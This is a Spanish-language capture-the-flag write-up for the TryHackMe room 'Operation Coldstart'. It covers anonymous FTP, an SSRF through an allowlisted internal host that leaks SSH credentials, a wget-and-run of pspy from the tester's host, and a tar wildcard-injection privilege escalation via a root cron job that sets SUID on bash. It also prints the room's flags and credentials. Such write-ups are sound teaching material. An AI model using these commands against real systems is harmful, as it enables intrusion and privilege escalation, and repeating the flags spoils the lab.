# TryHackMe — Operation Coldstart (Volt Labs)

**Sala:** Operation Coldstart
**Plataforma:** TryHackMe
**Dificultad:** Fácil
**Tema:** Enumeración · FTP anónimo · Revisión de código fuente · SSRF (allowlist `kestrel.thm`) · SSH · Procesos con pspy · **Wildcard injection en `tar`** (cron como root)
**Objetivo:** Recuperar el servidor de staging que *Volt Labs* dejó olvidado, obtener la flag de usuario y escalar hasta `root`.

> **Resumen en una línea:** `nmap` revela FTP anónimo con `backup.tar.gz` (código de la app); en `app.py` aparece el host interno `kestrel.thm`, al que se llega por **SSRF** en `/preview?url=` para leer las notas internas con las credenciales de `webdev`; tras SSH y la flag de usuario, un **cron de root ejecuta `tar` con comodín `*`** en un directorio escribible → *tar wildcard injection* → SUID bash → root.

---

## 0. Información de la máquina

- **IP:** varía con el despliegue (en las capturas: `10.66.190.154` en el reconocimiento/FTP y `10.66.191.162` en la fase web/SSH). Usa tu IP actual.
- **Hostname:** `coldstart` — Ubuntu 24.04.4 LTS.
- **Servicios:**

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.5 — **login anónimo permitido**, directorio `pub/` |
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu 3ubuntu13.16) |
| 80/tcp | HTTP | **gunicorn** — *Volt Labs — URL Preview Service (staging)* |

- **Usuarios:** `webdev` (foothold), `root` (objetivo).

---

## 1. Reconocimiento (Nmap)

```bash
nmap -sV -sC --open IP_MACHINA
```

![[Pasted image 20261117090342.png]]

Detalles clave del escaneo:

- `ftp-anon: Anonymous FTP login allowed (FTP code 230)` y directorio `pub`.
- Servidor web **gunicorn** (aplicación Python/Flask, no Apache).

![[Pasted image 20261117090535.png]]

*Continuación del escaneo: el 404 de gunicorn (página propia, no genérica) y el 200 de la portada.*

---

## 2. FTP anónimo — el backup del código

```bash
ftp anonymous@IP_MACHINA
```

![[Pasted image 20261117091708.png]]

Dentro del `ftp>`:

```
cd pub
ls
get backup.tar.gz
bye
```

![[Pasted image 20261117091807.png]]

`pub/backup.tar.gz` (2446 bytes). Descargado y extraído:

```bash
tar -xvf backup.tar.gz
# README.md  app.py  requirements.txt
```

---

## 3. Revisión del código fuente (`app.py`)

Lo interesante del volcado es la configuración del servidor de previsualización:

```python
from flask import Flask, request, abort
from urllib.parse import urlparse
import html
import requests

app = Flask(__name__)

# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}
```

![[Pasted image 20261117104140.png]]

- El endpoint `/preview?url=` **solo reenvía peticiones** a hosts de la lista → **SSRF con allowlist**.
- `kestrel.thm` resuelve a `127.0.0.1` **dentro de la máquina**, así que desde fuera no se puede tocar directamente: hay que pasar por el preview.
- El código también menciona la ruta interna `/admin/notes`.

---

## 4. SSRF — leyendo las notas internas

```
http://IP/preview?url=http://kestrel.thm/admin/notes
```

![[Pasted image 20261117105051.png]]

El servicio recupera la página interna y la devuelve en el *preview*:

```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

> **Credenciales obtenidas:** `webdev` / `V0ltLabs#summer`.

---

## 5. Acceso inicial — SSH como webdev

```bash
ssh webdev@IP_MACHINA
# password: V0ltLabs#summer
```

![[Pasted image 20261117105232.png]]

Flag de usuario:

```bash
cat user.txt
```

![[Pasted image 20261117105343.png]]

```
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

---

## 6. Enumeración: el cron de root que usa `tar`

`sudo -l` no da nada (`Sorry, user webdev may not run sudo on coldstart`). Subimos **pspy** para ver qué ejecuta root en segundo plano (ver `Comando Rapido/Escalada de privilegios Linux.md`):

```bash
wget http://IP_LOCAL/pspy64 && chmod +x pspy64 && ./pspy64
```

![[Pasted image 20261117112214.png]]

Aparece un cron **cada minuto como UID=0**:

```
/bin/bash -c cd /opt/backups && tar czf /var/backups/uploads.tgz *
tar czf /var/backups/uploads.tgz *
/bin/bash -c gzip ...
```

![[Pasted image 20261117112304.png]]

Puntos que lo hacen explotable:

- Corre **como root** cada minuto.
- `cd /opt/backups && tar ... *` → el `*` lo expande la shell **en un directorio escribible por nosotros**.
- `tar` con `--checkpoint*` en los argumentos ejecuta comandos → **wildcard / argument injection** (HackTricks: *Tar Wildcard Privilege Escalation*).

---

## 7. Wildcard injection en `tar`

Todo dentro de `/opt/backups` (secuencia final que funcionó):

```bash
cd /opt/backups
echo 'chmod +s /bin/bash' > privesc.sh
chmod +x privesc.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh privesc.sh'
ls -la
```

![[Pasted image 20261117113312.png]]

*Primer intento de payload (con ruta relativa, no funcionaba).*

![[Pasted image 20261117113330.png]]

*Creación de los ficheros `--checkpoint*` (fíjate en el error `toych` y en que `touch` necesita el `--` para aceptar opciones que empiezan por guiones).*

Cuando el cron ejecute `tar czf ... *`, el globo expande también los ficheros `--checkpoint=1` y `--checkpoint-action=exec=sh privesc.sh`, que `tar` interpreta como **argumentos propios** → lanza `sh privesc.sh` **como root**.

> **⚠️ Errores que salieron por el camino:**
>
> 1. **Ruta relativa en el payload:** `chmod +s bin/bash` falla porque el cron hace `cd /opt/backups` antes y ahí no existe `bin/bash`. Solución: ruta absoluta → `chmod +s /bin/bash` (o `cp /bin/bash /tmp/bash && chmod +s /tmp/bash`).
> 2. **`touch --"--checkpoint=1"` sin espacio:** sale `touch: unrecognized option '---checkpoint=1'`. El `--` debe ir **separado** de la opción: `touch -- '--checkpoint=1'`.

---

## 8. Resultado: root y flag

Tras esperar ~1 minuto a que el cron procesara el directorio con los argumentos inyectados:

```bash
/bin/bash -p
id
cd /root
cat flag.txt
```

![[Pasted image 20261117120946.png]]

- `id` → `uid=1001(webdev) ... euid=0(root)`: con `bash -p` el **euid efectivo es 0** aunque el real siga siendo `webdev`; `-p` impide que bash descarte el privilegio SUID.
- `/root` contiene `flag.txt` y `snap`.

**Flag de root:**

```
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

## 9. Flags y lecciones

| Flag | Valor |
| --- | --- |
| Usuario (`/home/webdev/user.txt`) | `THM{96dc7bd50d2fb98fcece01560788b5ab}` |
| Root (`/root/flag.txt`) | `THM{e6ee84a483d67ade06936fcfd1433e8a}` |

1. **FTP anónimo = copias de seguridad del código**: `backup.tar.gz` entregó `app.py` sin tocar la web.
2. **SSRF con allowlist** se salta el filtro usando el host confiable (`kestrel.thm`) como intermediary hacia `127.0.0.1`.
3. **pspy hace visible el cron invisible**: si root ejecuta `tar ... *` en un directorio tuyo, sospecha *wildcard injection*.
4. **Rutas absolutas en los payloads**: `chmod +s bin/bash` no es lo mismo que `chmod +s /bin/bash` cuando el cwd lo decide el cron.
5. **`touch --`** con `--` **separado** para crear ficheros que empiezan por guiones.
6. **`euid` vs `uid`**: un binario SUID solo levanta el euid; por eso se comprueba con `id` y se usa `bash -p`.

> Comandos relacionados: `Comando Rapido/Enumeracion web.md`, `Comando Rapido/Escalada de privilegios Linux.md`, `Comando Rapido/Shells y transferencia.md`, `Comando Rapido/Comandos básicos.md` (FTP/SCP).
